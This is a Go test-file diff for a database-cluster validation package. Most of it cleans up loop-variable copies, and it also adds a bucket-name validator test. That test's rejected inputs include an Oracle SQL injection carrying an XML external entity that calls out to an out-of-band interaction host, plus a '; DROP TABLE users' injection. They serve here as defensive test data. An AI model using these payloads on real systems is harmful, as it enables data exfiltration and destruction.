@@ -83,10 +83,9 @@ func TestValidateRFC1035(t *testing.T) {
 	}
 
 	for _, tc := range cases {
-		c := tc
-		t.Run(c.value, func(t *testing.T) {
+		t.Run(tc.value, func(t *testing.T) {
 			t.Parallel()
-			require.Equal(t, c.valid, validateRFC1035(c.value, "") == nil)
+			require.Equal(t, tc.valid, validateRFC1035(tc.value, "") == nil)
 		})
 	}
 }
@@ -167,8 +166,7 @@ func TestValidateCreateDatabaseClusterRequest(t *testing.T) {
 		},
 	}
 
-	for _, tc := range cases {
-		c := tc
+	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
 			t.Parallel()
 			err := validateCreateDatabaseClusterRequest(c.value)
@@ -262,8 +260,7 @@ func TestValidateProxy(t *testing.T) {
 			err:        errUnsupportedPGProxy,
 		},
 	}
-	for _, tc := range cases {
-		c := tc
+	for _, c := range cases {
 		t.Run(c.name, func(t *testing.T) {
 			t.Parallel()
 			err := validateProxy(DatabaseClusterSpecEngineType(c.engineType), c.proxyType)
@@ -305,7 +302,6 @@ func TestContainsVersion(t *testing.T) {
 		},
 	}
 	for _, tc := range cases {
-		tc := tc
 		t.Run(tc.version, func(t *testing.T) {
 			t.Parallel()
 			res := containsVersion(tc.version, tc.versions)
@@ -380,7 +376,6 @@ func TestValidateVersion(t *testing.T) {
 		},
 	}
 	for _, tc := range cases {
-		tc := tc
 		t.Run(tc.name, func(t *testing.T) {
 			t.Parallel()
 			err := validateVersion(tc.version, tc.engine)
@@ -432,7 +427,6 @@ func TestValidateBackupSpec(t *testing.T) {
 		},
 	}
 	for _, tc := range cases {
-		tc := tc
 		t.Run(tc.name, func(t *testing.T) {
 			t.Parallel()
 			cluster := &DatabaseCluster{}
@@ -501,7 +495,6 @@ func TestValidateBackupStoragesFor(t *testing.T) {
 		},
 	}
 	for _, tc := range cases {
-		tc := tc
 		t.Run(tc.name, func(t *testing.T) {
 			t.Parallel()
 			cluster := &DatabaseCluster{}
@@ -578,7 +571,6 @@ func TestValidatePitrSpec(t *testing.T) {
 		},
 	}
 	for _, tc := range cases {
-		tc := tc
 		t.Run(tc.name, func(t *testing.T) {
 			t.Parallel()
 			cluster := &DatabaseCluster{}
@@ -654,7 +646,6 @@ func TestValidateResourceLimits(t *testing.T) {
 		},
 	}
 	for _, tc := range cases {
-		tc := tc
 		t.Run(tc.name, func(t *testing.T) {
 			t.Parallel()
 			cluster := &DatabaseCluster{}
@@ -720,7 +711,6 @@ func TestValidateDataSource(t *testing.T) {
 		},
 	}
 	for _, tc := range cases {
-		tc := tc
 		t.Run(tc.name, func(t *testing.T) {
 			t.Parallel()
 			dsDB := &dataSourceStruct{}
@@ -875,7 +865,6 @@ func TestValidatePGReposForAPIDB(t *testing.T) {
 		},
 	}
 	for _, tc := range cases {
-		tc := tc
 		t.Run(tc.name, func(t *testing.T) {
 			t.Parallel()
 			db := &DatabaseCluster{}
@@ -921,7 +910,6 @@ func TestValidateMetadata(t *testing.T) {
 		},
 	}
 	for _, tc := range cases {
-		tc := tc
 		t.Run(tc.name, func(t *testing.T) {
 			t.Parallel()
 			err := validateMetadata(tc.metadata)
@@ -931,6 +919,47 @@ func TestValidateMetadata(t *testing.T) {
 			}
 			require.Error(t, err)
 			assert.Equal(t, err.Error(), tc.err.Error())
+		})
+	}
+}
+
+func TestValidateBucketName(t *testing.T) {
+	t.Parallel()
+
+	type tcase struct {
+		name  string
+		input string
+		err   error
+	}
+
+	tcases := []tcase{
+		{
+			name:  "empty string",
+			input: "",
+			err:   errInvalidBucketName,
+		},
+		{
+			name:  "too long",
+			input: `(select extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % uicfw SYSTEM \"http:\/\/t93xxgfug88povc63wzbdbsd349zxulx9pwfk4.oasti'||'fy.com\/\">%uicfw;]>'),'\/l') from dual)`,
+			err:   errInvalidBucketName,
+		},
+		{
+			name:  "unexpected symbol",
+			input: `; DROP TABLE users`,
+			err:   errInvalidBucketName,
+		},
+		{
+			name:  "correct",
+			input: "aaa-12-d.e",
+			err:   nil,
+		},
+	}
+
+	for _, tc := range tcases {
+		t.Run(tc.name, func(t *testing.T) {
+			t.Parallel()
+			err := validateBucketName(tc.input)
+			assert.ErrorIs(t, err, tc.err)
 		})
 	}
 }
